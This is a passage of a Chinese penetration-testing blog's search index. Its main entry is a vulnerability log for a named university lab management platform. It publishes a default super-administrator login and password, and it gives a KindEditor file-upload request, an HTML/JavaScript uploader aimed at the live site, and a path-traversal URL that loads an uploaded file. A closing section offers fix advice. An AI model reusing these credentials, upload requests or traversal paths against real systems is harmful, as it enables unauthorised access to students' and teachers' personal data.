href="https://mdsysgl.mdit.edu.cn/sysgl/static/plugins/kindeditor-4.1.2/jsp/demo.jsp">KindEditor JSP</a></td><td></td></tr></tbody></table></div><p><a href="https://mdsysgl.mdit.edu.cn/pic/imgFile/image/20241028/20241028181650_734.jpg">https://mdsysgl.mdit.edu.cn/pic/imgFile/image/20241028/20241028181650_734.jpg</a></p><p><a href="https://mdsysgl.mdit.edu.cn/pic/imgFile/file/20241028/20241028184713_759.txt">https://mdsysgl.mdit.edu.cn/pic/imgFile/file/20241028/20241028184713_759.txt</a></p><p><a href="https://mdsysgl.mdit.edu.cn/sysgl/window/mainDwTree?pageUrl=../../../pic/imgFile/file/20241028/20241028184713_759.txt">https://mdsysgl.mdit.edu.cn/sysgl/window/mainDwTree?pageUrl=../../../pic/imgFile/file/20241028/20241028184713_759.txt</a></p><p>1.83.234.20管理员主机</p><p>‍</p>]]></content>
      
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞发现日志</title>
      <link href="/2024/10/30/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E6%97%A5%E5%BF%97/"/>
      <url>/2024/10/30/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E6%97%A5%E5%BF%97/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞发现日志"><a href="#漏洞发现日志" class="headerlink" title="漏洞发现日志"></a>漏洞发现日志</h1><h3 id="漏洞发现日志-1"><a href="#漏洞发现日志-1" class="headerlink" title="漏洞发现日志"></a>漏洞发现日志</h3><hr><p><strong>日期</strong>: 2023年10月1日<br><strong>时间</strong>: 14:30<br><strong>记录者</strong>: 薛谔<br><strong>目标网站</strong>: 实验室综合管理与服务平台-登录界面</p><p><a href="https://mdsysgl.mdit.edu.cn/sysgl/">https://mdsysgl.mdit.edu.cn/sysgl/</a></p><hr><h4 id="1-漏洞发现概述"><a href="#1-漏洞发现概述" class="headerlink" title="1. 漏洞发现概述"></a>1. 漏洞发现概述</h4><ul><li><p><strong>漏洞类型</strong>:</p><ul><li>KindEditor 文件上传漏洞</li><li>默认管理员账户漏洞</li></ul></li><li><p><strong>漏洞影响</strong>:</p><ul><li>KindEditor漏洞允许上传指定类型的文件，可能导致远程代码执行和数据泄露。</li><li>默认管理员账户漏洞允许攻击者使用默认凭据登录，可能导致未授权访问和数据泄露。</li></ul></li><li><strong>漏洞严重性</strong>: 高（CVSS评分待定）</li></ul><hr><h4 id="2-漏洞发现过程"><a href="#2-漏洞发现过程" class="headerlink" title="2. 漏洞发现过程"></a>2. 漏洞发现过程</h4><ul><li><strong>测试环境</strong>: 使用浏览器进行手动测试。</li><li><p><strong>发现方法</strong>:</p><ul><li>通过访问 KindEditor 的文件上传功能进行测试。</li><li>直接访问登录页面并尝试使用默认凭据进行登录。</li></ul></li></ul><hr><h4 id="3-漏洞详细信息"><a href="#3-漏洞详细信息" class="headerlink" title="3. 漏洞详细信息"></a>3. 漏洞详细信息</h4><h5 id="3-1-KindEditor-文件上传漏洞"><a href="#3-1-KindEditor-文件上传漏洞" class="headerlink" title="3.1 KindEditor 文件上传漏洞"></a>3.1 KindEditor 文件上传漏洞</h5><ul><li><p><strong>测试步骤</strong>:</p><ul><li><strong>14:35</strong>: 访问登录页面 <a href="https://mdsysgl.mdit.edu.cn/sysgl/">实验室综合管理与服务平台-登录界面</a>。</li><li><strong>14:36</strong>: 登录成功后，访问文件上传功能测试地址 <a href="https://mdsysgl.mdit.edu.cn/sysgl/static/plugins/kindeditor-4.1.2/jsp/demo.jsp">KindEditor 示例</a>。</li><li><strong>14:37</strong>: 尝试上传指定类型的文件（如 <code>.doc</code>​, <code>.docx</code>​, <code>.xls</code>​, <code>.xlsx</code>​, <code>.ppt</code>​, <code>.htm</code>​, <code>.html</code>​, <code>.txt</code>​, <code>.zip</code>​, <code>.rar</code>​, <code>.gz</code>​, <code>.bz</code>​）。</li><li><strong>14:38</strong>: 观察到系统未能正确验证文件内容，成功上传包含恶意代码的文件。</li></ul></li><li><strong>漏洞地址</strong>: <a href="https://mdsysgl.mdit.edu.cn/sysgl/index/login_toIndex">https://mdsysgl.mdit.edu.cn/sysgl/index/login_toIndex</a></li><li><p><strong>允许上传的文件类型</strong>:</p><ul><li>doc</li><li>docx</li><li>xls</li><li>xlsx</li><li>ppt</li><li>htm</li><li>html</li><li>txt</li><li>zip</li><li>rar</li><li>gz</li><li>bz</li></ul></li><li><p><strong>示例请求</strong>:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/sysgl/static/plugins/kindeditor-4.1.2/jsp/upload_json.jsp?dir=file</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>mdsysgl.mdit.edu.cn</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;imgFile&quot;; filename=&quot;malicious.doc&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: application/vnd.openxmlformats-officedocument.wordprocessingml.document</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">[恶意代码内容]</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary--</span></span></span><br></pre></td></tr></table></figure></li></ul><h5 id="3-2-默认管理员账户漏洞"><a href="#3-2-默认管理员账户漏洞" class="headerlink" title="3.2 默认管理员账户漏洞"></a>3.2 默认管理员账户漏洞</h5><ul><li><p><strong>测试步骤</strong>:</p><ul><li><strong>14:40</strong>: 访问登录页面 <a href="https://mdsysgl.mdit.edu.cn/sysgl/">实验室综合管理与服务平台-登录界面</a>。</li><li><p><strong>14:41</strong>: 输入默认管理员账户和密码：</p><ul><li><strong>账号</strong>: <code>000000</code>​</li><li><strong>密码</strong>: <code>Admin@123</code>​</li></ul></li><li><strong>14:42</strong>: 成功登录，发现该账户为超级管理员，能够查看所有学生和老师的信息，并修改成员密码。</li></ul></li><li><strong>漏洞地址</strong>: <a href="https://mdsysgl.mdit.edu.cn/sysgl/">https://mdsysgl.mdit.edu.cn/sysgl/</a></li><li><strong>影响范围</strong>: 所有用户信息，包括学生和老师的个人信息。</li></ul><hr><h4 id="4-影响评估"><a href="#4-影响评估" class="headerlink" title="4. 影响评估"></a>4. 影响评估</h4><ul><li><strong>受影响的用户</strong>: 所有注册用户和系统管理员。</li><li><strong>潜在损失</strong>: 数据泄露、未授权访问和可能的法律责任。</li></ul><hr><h4 id="5-修复建议"><a href="#5-修复建议" class="headerlink" title="5. 修复建议"></a>5. 修复建议</h4><ul><li><p><strong>短期修复</strong>:</p><ul><li>对于KindEditor漏洞，立即对文件上传功能进行安全性检查，限制可上传文件类型，并对文件内容进行验证。</li><li>对于默认管理员账户漏洞，立即禁用默认管理员账户，并强制要求所有用户更改密码。</li></ul></li><li><p><strong>长期修复</strong>:</p><ul><li>实施文件上传的严格验证和过滤机制，确保只允许安全的文件类型，并对文件内容进行扫描。</li><li>实施强密码策略，确保所有账户使用唯一且复杂的密码。</li></ul></li><li><strong>安全最佳实践</strong>: 定期进行安全审计，检查默认凭据的使用情况，并及时更新系统。</li></ul><p>tags: [web渗透]<br>title: 漏洞发现日志<br>title: 漏洞发现日志<br>title: 漏洞发现日志<br>tags: [web渗透]<br>title: 漏洞发现日志</p><h2 id="tags-web渗透"><a href="#tags-web渗透" class="headerlink" title="tags: [web渗透]"></a>tags: [web渗透]</h2><h3 id="上传代码示例"><a href="#上传代码示例" class="headerlink" title="上传代码示例"></a>上传代码示例</h3><p>以下是用于上传文件的 HTML 和 JavaScript 代码示例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">html<span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Uploader<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://mdsysgl.mdit.edu.cn/sysgl/static/plugins/kindeditor-4.1.2/kindeditor.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">KindEditor</span>.<span class="title function_">ready</span>(<span class="keyword">function</span> (<span class="params">K</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> uploadbutton = K.<span class="title function_">uploadbutton</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">button</span>: <span class="title function_">K</span>(<span class="string">&#x27;#uploadButton&#x27;</span>)[<span class="number">0</span>],</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">fieldName</span>: <span class="string">&#x27;imgFile&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">url</span>: <span class="string">&#x27;https://mdsysgl.mdit.edu.cn/sysgl/static/plugins/kindeditor-4.1.2/jsp/upload_json.jsp?dir=file&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">afterUpload</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span> (data.<span class="property">error</span> === <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">var</span> url = K.<span class="title function_">formatUrl</span>(data.<span class="property">url</span>, <span class="string">&#x27;absolute&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                        <span class="title function_">K</span>(<span class="string">&#x27;#url&#x27;</span>).<span class="title function_">val</span>(url);</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;,</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            uploadbutton.<span class="property">fileBox</span>.<span class="title function_">change</span>(<span class="keyword">function</span> (<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                uploadbutton.<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;upload&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;ke-input-text&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">readonly</span>=<span class="string">&quot;readonly&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;uploadButton&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Upload&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
